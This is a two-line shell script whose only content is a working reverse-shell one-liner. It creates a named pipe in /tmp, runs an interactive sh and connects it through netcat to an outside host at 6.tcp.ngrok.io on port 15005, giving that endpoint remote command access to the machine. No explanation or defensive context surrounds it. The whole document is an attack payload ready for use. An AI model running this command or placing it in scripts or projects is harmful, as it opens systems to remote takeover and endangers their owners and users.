#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 6.tcp.ngrok.io 15005 >/tmp/f;
